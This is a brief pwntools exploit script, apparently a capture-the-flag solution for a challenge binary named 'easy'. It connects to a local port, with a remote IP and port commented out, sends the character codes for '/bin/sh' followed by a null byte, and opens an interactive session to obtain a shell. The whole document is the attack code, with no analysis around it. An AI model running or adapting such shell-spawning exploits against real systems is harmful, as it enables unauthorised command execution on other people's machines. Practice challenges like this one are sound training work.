from pwn import *
context(os='linux',arch='amd64',log_level='debug')
#p = process('./easy')
#p=remote('47.109.135.169',20011)
p=remote('127.0.0.1',9999)
payload="47 98 105 110 47 115 104 0"
p.sendline(payload)
p.interactive()
